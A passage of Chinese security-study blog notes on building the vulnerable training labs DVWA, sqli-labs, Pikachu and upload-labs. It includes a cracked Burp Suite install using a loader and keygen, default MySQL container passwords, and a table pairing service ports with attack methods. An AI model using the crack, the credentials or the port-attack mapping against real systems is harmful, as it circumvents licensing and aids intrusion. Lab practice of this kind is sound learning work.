incorrect</code></p><p>换一个浏览器，就可以了</p><p>猜测跟我chrome安装的第三方插件有关，关闭了以开发者运行该插件模式和插件，问题解决，再重新开启插件，问题没有出现。同时发现该插件有运行错误提示，这个插件是用来自动检测csrf的，所以猜测我的csrf token可能被误改了</p><p><a href="https://zhuanlan.zhihu.com/p/114089050">解决chrome 80出现的csrf token incorrect问题 - 知乎 (zhihu.com)</a></p></blockquote><h3 id="docker-compose搭建"><a href="#docker-compose搭建" class="headerlink" title="docker-compose搭建"></a>docker-compose搭建</h3><blockquote><p>可以一键启动容器（不建议，我是新手 亲自动手搞一下）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim docker-compose.yml</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version: &#x27;2&#x27;</span><br><span class="line">services:</span><br><span class="line"> dvwa:</span><br><span class="line">   image: mattrayner/lamp:1604-php5-base</span><br><span class="line">   volumes:</span><br><span class="line">    - ./dvwa:/app</span><br><span class="line">   expose: </span><br><span class="line">    - &quot;80&quot;</span><br><span class="line">   ports:</span><br><span class="line">    - &quot;8089:80&quot;</span><br><span class="line">   hostname: dvwa</span><br><span class="line">   restart: always</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><blockquote><p>使用此方法进入也需要配置dwvs</p></blockquote><h2 id="搭建sqli-labs靶场"><a href="#搭建sqli-labs靶场" class="headerlink" title="搭建sqli-labs靶场"></a>搭建sqli-labs靶场</h2><blockquote><p><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p></blockquote><blockquote><p>sqli-labs练习对应的关卡</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210052139550.png" alt="image-20221005213926219" style="zoom:50%;" /></blockquote><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在vps docker容器里面搭建了Lamp环境，同awvs一样安装于docker lamp的web目录下~~</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Audi-1/sqli-labs.git</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210052141977.png" alt="image-20221005214106758" style="zoom:33%;" /><p>在浏览器访问：<a href="http://124.223.217.243:8088/sqli-labs/">http://124.223.217.243:8088/sqli-labs/</a></p><h3 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h3><p>接下来要创建数据库，但会碰到报错：</p><p><code>Unable to connect to the database:security</code></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210052143530.png" alt="image-20221005214306326" style="zoom:50%;" /><p>无非就是数据库连接不上，，，但碰到的问题本质是没有创建security数据库，无法完成初始化，需要连上数据库手动创建</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#检查数据库</span></span><br><span class="line"><span class="built_in">cd</span> /root/share/sqli-labs/sql-connections</span><br><span class="line">vim setup-db.php</span><br><span class="line"><span class="comment">#查看到数据库信息在db-creds.inc文件</span></span><br><span class="line">vim db-creds.inc</span><br><span class="line"><span class="comment">#然后修改连接用户名和密码</span></span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210052144254.png" alt="image-20221005214410023" style="zoom:50%;" /><blockquote><p>发现不用修改这个文件，但在Windows上用phpstudy就需要修改这个</p></blockquote><p>我们连上数据库看看，，，，尝试进入mysql</p><p>老师推荐了一个好用的连接数据库的软件DBeaver</p><blockquote><p><a href="https://blog.csdn.net/tennysonsky/article/details/122397486?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1.pc_relevant_default&spm=1001.2101.3001.4242.2&utm_relevant_index=4">DBeaver教程</a></p></blockquote><h3 id="mysql设置允许数据库外连"><a href="#mysql设置允许数据库外连" class="headerlink" title="mysql设置允许数据库外连"></a>mysql设置允许数据库外连</h3><p>连接远程数据库需要设置<strong>mysql允许外连</strong></p><blockquote><ul><li><a href="https://blog.csdn.net/kuaisuzhuceh/article/details/46755025">设置mysql允许外连</a></li><li><a href="https://www.cnblogs.com/zxingwork/p/9743378.html">mysql允许外部连接设置</a></li><li><a href="https://baijiahao.baidu.com/s?id=1674649697151975361&wfr=spider&for=pc">新手连不上MySQL别急，无非这几个地方</a></li></ul></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim /etc/mysql/mysql.conf.d/mysqld.cnf</span><br><span class="line"><span class="comment">#设置mysql的配置文件/etc/mysql/my.cnf</span></span><br><span class="line"><span class="comment">#找到 bind-address  =127.0.0.1  将其注释掉；//使得不再只允许本地访问； </span></span><br><span class="line"><span class="comment">#重启mysql：</span></span><br><span class="line">/etc/init.d/mysql restart;</span><br></pre></td></tr></table></figure><blockquote><p>**备注:**云服务器设置远程访问别忘了开放3306端口，否则连接不上</p></blockquote><h3 id="问题所在"><a href="#问题所在" class="headerlink" title="问题所在"></a>问题所在</h3><p>连接上数据库后：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210052149129.png" alt="image-20221005214958883" style="zoom:50%;" /><p>上面无法连接数据库的原因是因为mysql之中没有security的数据库，创建它即可解决问题！</p><p>创建后再初始化数据库就可以成功</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mysql</span><br><span class="line">create database security;</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210052150693.png" alt="image-20221005215024452" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210052150985.png" alt="image-20221005215054724" style="zoom:50%;" /><p>完成！</p><p>搭建完成！！</p><h3 id="docker搭建"><a href="#docker搭建" class="headerlink" title="docker搭建"></a>docker搭建</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="搭建Pikachu靶场"><a href="#搭建Pikachu靶场" class="headerlink" title="搭建Pikachu靶场"></a>搭建Pikachu靶场</h2><blockquote><p><a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a></p></blockquote><h3 id="docker搭建-1"><a href="#docker搭建-1" class="headerlink" title="docker搭建"></a>docker搭建</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull area39/pikachu</span><br><span class="line">docker run -dit -p &quot;8087:80&quot; -v $&#123;PWD&#125;/share:/app area39/pikachu</span><br></pre></td></tr></table></figure><h3 id="放到lamp的web目录搭建"><a href="#放到lamp的web目录搭建" class="headerlink" title="放到lamp的web目录搭建"></a>放到lamp的web目录搭建</h3><blockquote><p>前文提到lamp目录的搭建~</p><p>数据库使用的是mysql，因此运行Pikachu你需要提前安装好”PHP+MYSQL+中间件（如apache,nginx等）”的基础环境，建议在你的测试环境直接使用 一些集成软件来搭建这些基础环境,比如XAMPP,WAMP等,作为一个搞安全的人,这些东西对你来说应该不是什么难事。接下来:<br>–&gt;把下载下来的pikachu文件夹放到web服务器根目录下;<br>–&gt;根据实际情况修改<code>inc/config.inc.php</code>里面的数据库连接配置;<br>–&gt;访问<code>http://x.x.x.x/pikachu</code>,会有一个红色的热情提示”欢迎使用,pikachu还没有初始化，点击进行初始化安装!”,点击即可完成安装。</p><blockquote><p><a href="https://github.com/zhuifengshaonianhanlu/pikachu.git">https://github.com/zhuifengshaonianhanlu/pikachu.git</a></p></blockquote></blockquote><blockquote><p>lamp-dokcer环境的mysql密码可以自己修改也可以去查看，修改完配置文件的数据库密码后，就可以初始化pokachu系统的了~~~很简单</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#注 lamp:1604-php5-base镜像生成的容器密码是这么多：</span></span><br><span class="line">mysql -uadmin -pONS8OvevwcVo -h&lt;host&gt; -P&lt;port&gt;</span><br><span class="line"><span class="comment">#后来的mattrayner/lamp:latest-1604-php5</span></span><br><span class="line"><span class="comment">#查看到密码如下</span></span><br><span class="line">You can now connect to this MySQL Server with U2EKSVPn7VRJ</span><br><span class="line">    mysql -uadmin -peJ1dB2FcCZPh -h&lt;host&gt; -P&lt;port&gt;</span><br></pre></td></tr></table></figure></blockquote><h2 id="搭建upload-labs靶场"><a href="#搭建upload-labs靶场" class="headerlink" title="搭建upload-labs靶场"></a>搭建upload-labs靶场</h2><blockquote><p>upload-labs：<a href="https://github.com/c0ny1/upload-labs/releases">https://github.com/c0ny1/upload-labs/releases</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LAMP 下载源码方式：其php版本要求是5.2.17，其他版本会出些许问题</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/c0ny1/upload-labs.git</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker快速搭建方式</span><br><span class="line">创建镜像</span><br><span class="line"><span class="built_in">cd</span> upload-labs/docker</span><br><span class="line">docker build -t upload-labs </span><br><span class="line">或</span><br><span class="line">docker pull c0ny1/upload-labs</span><br><span class="line">创建容器</span><br><span class="line">sudo docker run -dit -p 8089:80 upload-labs:latest</span><br><span class="line">进入容器：docker <span class="built_in">exec</span> -it e6 bash</span><br><span class="line">重命名容器：docker rename CONTAINER NEW_NAME</span><br></pre></td></tr></table></figure><h1 id="将会补充的内容"><a href="#将会补充的内容" class="headerlink" title="将会补充的内容"></a>将会补充的内容</h1><table><thead><tr><th><img src="http://124.223.217.243:8088/icons/blank.gif" alt="[ICO]"></th><th><a href="http://124.223.217.243:8088/?C=N;O=D">Name</a></th><th><a href="http://124.223.217.243:8088/?C=M;O=A">Last modified</a></th><th><a href="http://124.223.217.243:8088/?C=S;O=A">Size</a></th><th><a href="http://124.223.217.243:8088/?C=D;O=A">Description</a></th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td></tr><tr><td><img src="http://124.223.217.243:8088/icons/folder.gif" alt="[DIR]"></td><td><a href="http://124.223.217.243:8088/dvws/">dvws&#x2F;</a></td><td>2022-03-10 10:07</td><td>-</td><td></td></tr><tr><td><img src="http://124.223.217.243:8088/icons/folder.gif" alt="[DIR]"></td><td><a href="http://124.223.217.243:8088/exec/">exec&#x2F;</a></td><td>2022-03-24 07:29</td><td>-</td><td></td></tr><tr><td><img src="http://124.223.217.243:8088/icons/folder.gif" alt="[DIR]"></td><td><a href="http://124.223.217.243:8088/pikachu/">pikachu&#x2F;</a></td><td>2022-06-04 03:14</td><td>-</td><td></td></tr><tr><td><img src="http://124.223.217.243:8088/icons/folder.gif" alt="[DIR]"></td><td><a href="http://124.223.217.243:8088/sqli-labs/">sqli-labs&#x2F;</a></td><td>2022-03-16 12:41</td><td>-</td><td></td></tr><tr><td><img src="http://124.223.217.243:8088/icons/folder.gif" alt="[DIR]"></td><td><a href="http://124.223.217.243:8088/upload-labs/">upload-labs&#x2F;</a></td><td>2022-03-22 10:58</td><td>-</td><td></td></tr></tbody></table><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://zhuanlan.zhihu.com/p/114089050">解决chrome 80出现的csrf token incorrect问题 - 知乎 (zhihu.com)</a></li></ul></blockquote><blockquote><p><strong>声明：</strong></p><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> WEB安全 </category>
          
          <category> Web安全靶场 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Burpsuite使用</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7/Burpsuite%E4%BD%BF%E7%94%A8.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7/Burpsuite%E4%BD%BF%E7%94%A8.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>burp主要用于抓取http数据包</p><h1 id="Burpsuite使用入门"><a href="#Burpsuite使用入门" class="headerlink" title="Burpsuite使用入门"></a>Burpsuite使用入门</h1><ol><li>PPT文件夹，《burpsuite.pdf》</li><li><a href="https://portswigger.net/burp/documentation/desktop/getting-started/intercepting-http-traffic">官方文档</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
          <category> 抓包工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Burpsuite安装及配置</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7/Burpsuite%E5%AE%89%E8%A3%85%E5%8F%8A%E9%85%8D%E7%BD%AE.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7/Burpsuite%E5%AE%89%E8%A3%85%E5%8F%8A%E9%85%8D%E7%BD%AE.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Burp Suite是一个集成化的渗透测试工具，它集合了多种渗透测试组件，使我们自动化地或手工地能更好的完成对 Web 应用的渗透测试和攻击。</p><p>Burp Suite是由Java语言编写而成，而依托Java自身的跨平台性，使得软件在不同系统平台使用更加方便。</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><blockquote><p>网上很多安装激活的方法，此处不赘述，记录的是关于vbs脚本自动化操作</p></blockquote><h2 id="百度网盘下载："><a href="#百度网盘下载：" class="headerlink" title="百度网盘下载："></a>百度网盘下载：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件名：BurpSuite2022.1.1.zip</span><br><span class="line">链接：https://pan.baidu.com/s/1ILww3TZsKd7U07dJudbEEA</span><br><span class="line">提取码：oxfv</span><br></pre></td></tr></table></figure><h2 id="缩小-jar-包体积新版的-BurpSuite"><a href="#缩小-jar-包体积新版的-BurpSuite" class="headerlink" title="缩小 jar 包体积新版的 BurpSuite"></a>缩小 jar 包体积新版的 BurpSuite</h2><p>默认下载的 jar  格式的版本里面包含了四个平台的 chromium包：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">D:\MyTools\BurpSuite2022.1.1&gt;<span class="built_in">ls</span> -l</span><br><span class="line">total 1021758</span><br><span class="line">-rw-rw-rw-   1 user     group        4286 Jan 26 18:50 BurpSuite.ico</span><br><span class="line">-rw-rw-rw-   1 user     group         152 Feb 17 14:24 BurpSuite2022.1.1.sh</span><br><span class="line">-rw-rw-rw-   1 user     group         213 Feb 17 14:27 BurpSuite2022.1.1.vbs</span><br><span class="line">-rw-rw-rw-   1 user     group        1384 Feb 17 14:29 BurpSuite2022.1.1.vbs.lnk</span><br><span class="line">-rw-rw-rw-   1 user     group      170854 Jan 26 18:50 BurpSuiteLoader2022.1.1.jar</span><br><span class="line">-rw-rw-rw-   1 user     group    523016416 Feb 10 01:26 Burpsuite2022.1.1.jar</span><br><span class="line">drwxrwxrwx   1 user     group           0 Feb 17 14:27 jre</span><br><span class="line">-rw-rw-rw-   1 user     group       65249 Nov 21 21:58 keygen.jar</span><br><span class="line">D:\MyTools\BurpSuite2022.1.1&gt;unzip -l Burpsuite2022.1.1.jar | findstr chromium</span><br><span class="line">128928239  22-02-09 12:05   chromium-linux64-98.0.4758.80.zip</span><br><span class="line">101698452  22-02-09 12:05   chromium-macosarm64-98.0.4758.80.zip</span><br><span class="line">102529177  22-02-09 12:05   chromium-macosx64-98.0.4758.80.zip</span><br><span class="line">114797296  22-02-09 12:05   chromium-win64-98.0.4758.82.zip</span><br><span class="line">       86  22-02-09 12:16   chromium.properties</span><br></pre></td></tr></table></figure><p>只保留Windows平台的 chromium  包:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">zip -q -d Burpsuite2022.1.1.jar chromium-linux64-98.0.4758.80.zip</span><br><span class="line">zip -q -d Burpsuite2022.1.1.jar chromium-macosarm64-98.0.4758.80.zip</span><br><span class="line">zip -q -d Burpsuite2022.1.1.jar chromium-macosx64-98.0.4758.80.zip</span><br></pre></td></tr></table></figure><p>原先大小为 498M ，删除之后瘦小到了 182M</p><h2 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h2><blockquote><p>Windows 平台，鼠标双击运行文件：BurpSuite2022.1.1.vbs</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">CreateObject(<span class="string">&quot;WScript.Shell&quot;</span>).Run <span class="string">&quot;.\jre\bin\javaw.exe -Xmx8G -XX:-UseParallelGC --illegal-access=permit -noverify -javaagent:BurpSuiteLoader2022.1.1.jar -Dfile.encoding=utf-8 -jar Burpsuite2022.1.1.jar %*&quot;</span>,vbhide</span><br><span class="line"></span><br><span class="line">脚本含义（注意英文目录下执行，不然会报错）：</span><br><span class="line">CreateObject(<span class="string">&quot;WScript.Shell&quot;</span>)创造一个WScript.Shell的对象</span><br><span class="line">.Run使用run方法执行一个命令：使用javaw.exe启动burp</span><br><span class="line">,vbhide，</span><br><span class="line">-javaagent:BurpSuiteLoader2022.1.1.jar启动加载burp的jar包的名字</span><br><span class="line">-jar Burpsuite2022.1.1.jar %*  正式的burp的jar包</span><br></pre></td></tr></table></figure><p>Linux 平台，终端执行命令： sh BurpSuite2022.1.1.sh</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -Xmx8G -XX:-UseParallelGC --illegal-access=permit -noverify -Dfile.encoding=utf-8 -javaagent:BurpSuiteLoader2022.1.1.jar -jar Burpsuite2022.1.1.jar</span><br></pre></td></tr></table></figure></blockquote><h2 id="burp安装过程中的一些问题："><a href="#burp安装过程中的一些问题：" class="headerlink" title="burp安装过程中的一些问题："></a>burp安装过程中的一些问题：</h2><p>原先jdk版本太低，导致vbs脚本一起运行不起来，但是不允许也是可以破解burp的，只不过强迫症患者一定要去解决自己电脑上出现的问题。将java version “1.8.0_271”升级为17版本</p><p>（老师附带的jre，好像不行，不知道为什么）</p><p>emm,升级了jdk为14，17版本，BurpSuiteLoader2022.1.1.jar文件均运行不起来</p><p>后来发现 ：是目录有中文的原因。。将目录改成全英文，emm就可以了</p><blockquote><p><a href="https://blog.csdn.net/qq_44624536/article/details/114242178">安装BurpSuite时，配置完Java环境后burp-loader-keygen.jar无法打开的问题</a>：</p></blockquote><blockquote><ul><li>新版的burp需要jdk8以上版本才可以运行，在老师给的burp文件夹里面附带了14版本的jre</li><li>老师写的vbs脚本可以一键运行burp</li></ul></blockquote><h1 id="浏览器设置"><a href="#浏览器设置" class="headerlink" title="浏览器设置"></a>浏览器设置</h1><blockquote><ul><li>firefox浏览器代理插件：</li></ul><p><a href="https://addons.mozilla.org/zh-CN/firefox/addon/switchyomega/">https://addons.mozilla.org/zh-CN/firefox/addon/switchyomega/</a></p><ul><li>edge浏览器代理插件：</li></ul><p><a href="https://microsoftedge.microsoft.com/addons/detail/proxy-switchyomega/fdbloeknjpnloaggplaobopplkdhnikc?hl=zh-CN">https://microsoftedge.microsoft.com/addons/detail/proxy-switchyomega/fdbloeknjpnloaggplaobopplkdhnikc?hl=zh-CN</a></p><ul><li>chrome浏览器代理插件：</li></ul><p><a href="https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif">https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif</a></p></blockquote><h1 id="https抓包"><a href="#https抓包" class="headerlink" title="https抓包"></a>https抓包</h1><h2 id="https证书下载"><a href="#https证书下载" class="headerlink" title="https证书下载"></a>https证书下载</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Proxy &gt; Options &gt; Proxy Listeners &gt; Regenerate CA certificate</span><br><span class="line">Import / export CA certificate &gt; Export &gt; Certificate in DER format &gt; next</span><br></pre></td></tr></table></figure><p>保存证书到 burpsuite.der 文件</p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>浏览器设置代理 127.0.0.1:8080 后，访问 <a href="http://burp/">http://burp</a> ，点击页面 CA Certificate 按钮，下载证书 cacert.der 。</p><h2 id="安装证书"><a href="#安装证书" class="headerlink" title="安装证书"></a>安装证书</h2><p>双击打开 burpsuite.der 证书文件，选择安装证书,选择，将所有证书都放入下列存:储：受信任的根证书颁发机构</p><h2 id="firefox-浏览器导入证书"><a href="#firefox-浏览器导入证书" class="headerlink" title="firefox 浏览器导入证书"></a>firefox 浏览器导入证书</h2><p>点击火狐浏览器右上角栏→选项→右上角搜索处搜“证书”→证书颁发机构-&gt;导入-&gt;选择下载的 cacert.der 证书-&gt;信任证书-&gt;确定</p><p>查看证书，有了 PortSwigger 机构的证书，导入成功</p><h2 id="chrome-x2F-edge-浏览器导入证书"><a href="#chrome-x2F-edge-浏览器导入证书" class="headerlink" title="chrome&#x2F;edge 浏览器导入证书"></a>chrome&#x2F;edge 浏览器导入证书</h2><p>输入 chrome:&#x2F;&#x2F;settings&#x2F; 进入浏览器设置，在设置中搜索管理证书</p><p>安全 &gt; 管理证书 &gt; 受信任的根证书颁发机构 &gt; 导入 &gt; 选择 burpsuite.der</p><h1 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h1><h2 id="火狐浏览器抓包问题"><a href="#火狐浏览器抓包问题" class="headerlink" title="火狐浏览器抓包问题"></a>火狐浏览器抓包问题</h2><p>问题：总是有到 <a href="http://detectportal.firefox.com/success.txt">http://detectportal.firefox.com/success.txt</a> 的请求流量</p><p>解决：</p><ol><li>在浏览器的地址栏输入 about:config 。</li><li>输入 network.captive-portal-service.en ，进行查找。</li><li>本来该项的值是 true ，双击 true  这个地方，改成 false  即可。</li><li>修改完以后，直接关闭，无需保存，就不会再出现上述的数据包了。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
          <category> 抓包工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透常用端口总结</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E6%80%BB%E7%BB%93.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E6%80%BB%E7%BB%93.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>转自该大佬文章：<a href="https://www.cnblogs.com/bmjoker/p/8833316.html">黑客常用端口利用总结</a></p><h1 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h1><table><thead><tr><th align="center">端口</th><th align="center">服务</th><th align="center">入侵方式</th></tr></thead><tbody><tr><td align="center">21</td><td align="center">ftp&#x2F;tftp&#x2F;vsftpd文件传输协议</td><td align="center">爆破&#x2F;嗅探&#x2F;溢出&#x2F;后门</td></tr><tr><td align="center">22</td><td align="center">ssh远程连接</td><td align="center">爆破&#x2F;openssh漏洞</td></tr><tr><td align="center">23</td><td align="center">Telnet远程连接</td><td align="center">爆破&#x2F;嗅探&#x2F;弱口令</td></tr><tr><td align="center">25</td><td align="center">SMTP邮件服务</td><td align="center">邮件伪造</td></tr><tr><td align="center">53</td><td align="center">DNS域名解析系统</td><td align="center">域传送&#x2F;劫持&#x2F;缓存投毒&#x2F;欺骗</td></tr><tr><td align="center">67&#x2F;68</td><td align="center">dhcp服务</td><td align="center">劫持&#x2F;欺骗</td></tr><tr><td align="center">110</td><td align="center">pop3</td><td align="center">爆破&#x2F;嗅探</td></tr><tr><td align="center">139</td><td align="center">Samba服务</td><td align="center">爆破&#x2F;未授权访问&#x2F;远程命令执行</td></tr><tr><td align="center">143</td><td align="center">Imap协议</td><td align="center">爆破</td></tr><tr><td align="center">161</td><td align="center">SNMP协议</td><td align="center">爆破&#x2F;搜集目标内网信息</td></tr><tr><td align="center">389</td><td align="center">Ldap目录访问协议</td><td align="center">注入&#x2F;未授权访问&#x2F;弱口令</td></tr><tr><td align="center">445</td><td align="center">smb</td><td align="center">ms17-010&#x2F;端口溢出</td></tr><tr><td align="center">512&#x2F;513&#x2F;514</td><td align="center">Linux Rexec服务</td><td align="center">爆破&#x2F;Rlogin登陆</td></tr><tr><td align="center">873</td><td align="center">Rsync服务</td><td align="center">文件上传&#x2F;未授权访问</td></tr><tr><td align="center">1080</td><td align="center">socket</td><td align="center">爆破</td></tr><tr><td align="center">1352</td><td align="center">Lotus domino邮件服务</td><td align="center">爆破&#x2F;信息泄漏</td></tr><tr><td align="center">1433</td><td align="center">mssql</td><td align="center">爆破&#x2F;注入&#x2F;SA弱口令</td></tr><tr><td align="center">1521</td><td align="center">oracle</td><td align="center">爆破&#x2F;注入&#x2F;TNS爆破&#x2F;反弹shell</td></tr><tr><td align="center">2049</td><td align="center">Nfs服务</td><td align="center">配置不当</td></tr><tr><td align="center">2181</td><td align="center">zookeeper服务</td><td align="center">未授权访问</td></tr><tr><td align="center">2375</td><td align="center">docker remote api</td><td align="center">未授权访问</td></tr><tr><td align="center">3306</td><td align="center">mysql</td><td align="center">爆破&#x2F;注入</td></tr><tr><td align="center">3389</td><td align="center">Rdp远程桌面链接</td><td align="center">爆破&#x2F;shift后门</td></tr><tr><td align="center">4848</td><td align="center">GlassFish控制台</td><td align="center">爆破&#x2F;认证绕过</td></tr><tr><td align="center">5000</td><td align="center">sybase&#x2F;DB2数据库</td><td align="center">爆破&#x2F;注入&#x2F;提权</td></tr><tr><td align="center">5432</td><td align="center">postgresql</td><td align="center">爆破&#x2F;注入&#x2F;缓冲区溢出</td></tr><tr><td align="center">5632</td><td align="center">pcanywhere服务</td><td align="center">抓密码&#x2F;代码执行</td></tr><tr><td align="center">5900</td><td align="center">vnc</td><td align="center">爆破&#x2F;认证绕过</td></tr><tr><td align="center">6379</td><td align="center">Redis数据库</td><td align="center">未授权访问&#x2F;爆破</td></tr><tr><td align="center">7001&#x2F;7002</td><td align="center">weblogic</td><td align="center">java反序列化&#x2F;控制台弱口令</td></tr><tr><td align="center">80&#x2F;443</td><td align="center">http&#x2F;https</td><td align="center">web应用漏洞&#x2F;心脏滴血</td></tr><tr><td align="center">8069</td><td align="center">zabbix服务</td><td align="center">远程命令执行&#x2F;注入</td></tr><tr><td align="center">8161</td><td align="center">activemq</td><td align="center">弱口令&#x2F;写文件</td></tr><tr><td align="center">8080&#x2F;8089</td><td align="center">Jboss&#x2F;Tomcat&#x2F;Resin</td><td align="center">爆破&#x2F;PUT文件上传&#x2F;反序列化</td></tr><tr><td align="center">8083&#x2F;8086</td><td align="center">influxDB</td><td align="center">未授权访问</td></tr><tr><td align="center">9000</td><td align="center">fastcgi</td><td align="center">远程命令执行</td></tr><tr><td align="center">9090</td><td align="center">Websphere控制台</td><td align="center">爆破&#x2F;java反序列化&#x2F;弱口令</td></tr><tr><td align="center">9200&#x2F;9300</td><td align="center">elasticsearch</td><td align="center">远程代码执行</td></tr><tr><td align="center">11211</td><td align="center">memcached</td><td align="center">未授权访问</td></tr><tr><td align="center">27017&#x2F;27018</td><td align="center">mongodb</td><td align="center">未授权访问&#x2F;爆破</td></tr></tbody></table><h1 id="21端口渗透剖析"><a href="#21端口渗透剖析" class="headerlink" title="21端口渗透剖析"></a>21端口渗透剖析</h1><p>FTP通常用作对远程服务器进行管理，典型应用就是对web系统进行管理。一旦FTP密码泄露就直接威胁web系统安全，甚至黑客通过提权可以直接控制服务器。这里剖析渗透FTP服务器的几种方法。</p><p>FTP：文件传输协议，使用TCP端口20、21，20用于传输数据，21用于传输控制信息</p><blockquote><p>（1）基础爆破：ftp爆破工具很多，这里我推owasp的Bruter,hydra以及msf中的ftp爆破模块。</p><p>（2) ftp匿名访问：用户名：anonymous 密码：为空或者任意邮箱</p><p>（3）后门vsftpd ：version 2到2.3.4存在后门漏洞，攻击者可以通过该漏洞获取root权限。</p><blockquote><p><a href="https://www.freebuf.com/column/143480.html">漏洞复现-vsftpd-v2.3.4：</a></p></blockquote><p>（4）嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）,使用Cain进行渗透。</p><p>（5）ftp远程代码溢出。</p><blockquote><p><a href="https://blog.csdn.net/weixin_42214273/article/details/82892282">ProFTPD 1.3.3c远程命令执行：</a></p></blockquote><p>（6）ftp跳转攻击。</p><blockquote><p><a href="https://blog.csdn.net/mgxcool/article/details/48249473">https://blog.csdn.net/mgxcool/article/details/48249473</a></p></blockquote></blockquote><h1 